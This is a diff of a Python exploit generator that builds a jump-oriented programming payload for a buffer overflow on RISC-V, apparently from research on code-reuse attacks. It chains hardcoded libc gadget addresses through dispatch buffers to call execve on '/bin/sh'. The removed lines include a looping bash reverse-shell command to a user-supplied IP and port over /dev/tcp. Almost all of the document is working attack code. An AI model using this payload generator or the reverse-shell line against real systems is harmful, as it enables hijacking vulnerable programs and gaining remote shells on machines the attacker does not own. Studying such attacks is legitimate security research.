@@ -77,19 +77,19 @@ class longjmpBuf(buffer):
 
 # buffer for dispatch/initializer gadget to load registers from
 class dispatchBuf(buffer):
-    def __init__(self, buf_ptr):
+    def __init__(self):
         self.buf = [0 for i in range(27)]
-        if isinstance(buf_ptr, int):
-            # The gadget loads registers from *(t0+176) through *(t0+392)
-            self.dispatch_buf = buf_ptr - 176
-            # The total number of bytes it reads 216 bytes
-            self.next_dispatch_buf = buf_ptr + self.size()
-        else:
-            self.dispatch_buf = buf_ptr.next_dispatch_buf - 176
-            self.next_dispatch_buf = buf_ptr.next_dispatch_buf + self.size()
+        # if isinstance(buf_ptr, int):
+        #     # The gadget loads registers from *(t0+176) through *(t0+392)
+        #     self.dispatch_buf = buf_ptr - 176
+        #     # The total number of bytes it reads 216 bytes
+        #     self.next_dispatch_buf = buf_ptr + self.size()
+        # else:
+        #     self.dispatch_buf = buf_ptr.next_dispatch_buf - 176
+        #     self.next_dispatch_buf = buf_ptr.next_dispatch_buf + self.size()
 
-        # Point the next t0 to the next buf address minus the 176 byte offset
-        self.set_s3(self.next_dispatch_buf - 176)
+        # # Point the next t0 to the next buf address minus the 176 byte offset
+        # self.set_s3(self.next_dispatch_buf - 176)
     
     def set_t1(self, t1):
         self.buf[0] = t1
@@ -121,6 +121,8 @@ class dispatchBuf(buffer):
         self.buf[18] = s2
     def set_s3(self, s3):
         self.buf[19] = s3
+    def set_s7(self, s7):
+        self.buf[23] = s7
 
 # Helper function to print strings by chaining calls to putchar
 def print_string(string, bufs):
@@ -144,6 +146,9 @@ mv_s0_to_a3_jalr_s9 = 0x200004b38c
 execve = 0x20000ad180
 putchar = 0x2000080bcc
 
+# Misinterpreted hidden/misaligned gadgets
+add_s7_to_t0_jalr_ra = 0x20000e99f2
+
 # Unused pointers
 bin_sh_str = 0x20001178a8
 mv_a0a1a2_jalr_a5 = 0x2000067010
@@ -155,15 +160,15 @@ parser.add_argument('-o', '--out', type=str, help='output file name', default='d
 parser.add_argument('-m', '--msg', type=str, help='string to print out', default='RISC-V JOP Success')
 parser.add_argument('--buffer-size', type=int, help='size of buffer to overflow', default=10000)
 parser.add_argument('--buffer-address', type=lambda x: int(x,0), help='address of overflowable buffer', default=0x2aaaaad480)
-parser.add_argument('-e','--execve', type=ast.literal_eval, help="python list of strings to execve: \"['/bin/bash', '-c', 'echo \\'run a script\\'; echo \\'like this\\'; /bin/bash']\"", default=["/bin/bash"])
-parser.add_argument('-r', '--reverse-shell', type=str, metavar='IP:port', help="Spin on opening a reverse shell to IP:port - overrides execve argument")
+# parser.add_argument('-e','--execve', type=ast.literal_eval, help="python list of strings to execve: \"['/bin/bash', '-c', 'echo \\'run a script\\'; echo \\'like this\\'; /bin/bash']\"", default=["/bin/bash"])
+# parser.add_argument('-r', '--reverse-shell', type=str, metavar='IP:port', help="Spin on opening a reverse shell to IP:port - overrides execve argument")
 args = parser.parse_args()
 
-if args.reverse_shell is not None:
-    IP, port = args.reverse_shell.split(':')
-    print('exploit will open reverse shell to:', IP, port)
-    # Keep on retrying to open the reverse shell with while true
-    args.execve = ['/bin/bash', '-c', 'cd /\n while true; do\n /bin/bash -i 2>/dev/null >& /dev/tcp/' + IP + '/' + port + ' 0>&1\n done\n']
+# if args.reverse_shell is not None:
+#     IP, port = args.reverse_shell.split(':')
+#     print('exploit will open reverse shell to:', IP, port)
+#     # Keep on retrying to open the reverse shell with while true
+#     args.execve = ['/bin/bash', '-c', 'cd /\n while true; do\n /bin/bash -i 2>/dev/null >& /dev/tcp/' + IP + '/' + port + ' 0>&1\n done\n']
 
 dispatch_file = open(args.out, 'w')
 
@@ -171,33 +176,35 @@ dispatch_file = open(args.out, 'w')
 # Chain gadgets to get some space to reuse as the stack for putchar
 # These can replaced with zero bufs, in which case the JOP chain would start from a later buf
 # TODO: try finding a way to increment t0 instead of needing its address - no luck in libc
-buf1 = dispatchBuf(args.buffer_address)
-buf1.set_t1(mv_s3_to_t0_jalr_a3)
-buf1.set_a3(load_regs_from_t0)
+buf1 = dispatchBuf()
+buf1.set_t1(add_s7_to_t0_jalr_ra)
+buf1.set_s7(buf1.size())
+buf1.set_ra(load_regs_from_t0)
 
-buf2 = dispatchBuf(buf1)
-buf2.set_t1(mv_s3_to_t0_jalr_a3)
-buf2.set_a3(load_regs_from_t0)
+buf2 = dispatchBuf()
+buf2.set_t1(add_s7_to_t0_jalr_ra)
+buf2.set_s7(buf2.size())
+buf2.set_ra(load_regs_from_t0)
 
 bufs = [buf1, buf2]
 
 # Check if the exploit should print a message
-if args.msg != None and args.msg != '':
+# if args.msg != None and args.msg != '':
     # Add more dispatch buffers to chain calls to putchar
-    print_string(args.msg + '\n', bufs)
+    # print_string(args.msg + '\n', bufs)
 
 # Add a buffer with the array of strings following the putchars
-execve_strbuf = stringArrayBuf(bufs[-1].next_dispatch_buf, args.execve)
-# Have the last putchar jump past this string buffer
-bufs[-1].set_s3(execve_strbuf.address + execve_strbuf.size() - 176)
-bufs.append(execve_strbuf)
+# execve_strbuf = stringArrayBuf(bufs[-1].next_dispatch_buf, args.execve)
+# # Have the last putchar jump past this string buffer
+# bufs[-1].set_s3(execve_strbuf.address + execve_strbuf.size() - 176)
+# bufs.append(execve_strbuf)
 
 # Final buffer jumps to execve. It starts after the string array buffer
-final_buf = dispatchBuf(execve_strbuf.address + execve_strbuf.size())
+final_buf = dispatchBuf()
 # Set the first argument to the first strihng in the string buf - the executable to run
-final_buf.set_a0(execve_strbuf.buf[0])
+final_buf.set_a0(bin_sh_str)
 # Pass the entire char*[] to the second argument
-final_buf.set_a1(execve_strbuf.address)
+final_buf.set_a1(0)
 final_buf.set_a2(0)
 final_buf.set_t1(execve)
 bufs.append(final_buf)
@@ -223,7 +230,7 @@ if remaining_size > 0:
 # Buffer for registers to be loaded by longjmp
 longjmp = longjmpBuf()
 # s3 is copied to t0 and should point to the first dispatch buf
-longjmp.set_s3(bufs[0].dispatch_buf)
+longjmp.set_s3(args.buffer_address - 176)
 # First jump to the gadget to set a3 from s0
 longjmp.set_ra(mv_s0_to_a3_jalr_s9)
 # After that, jump to the gadget to set t0 from s3
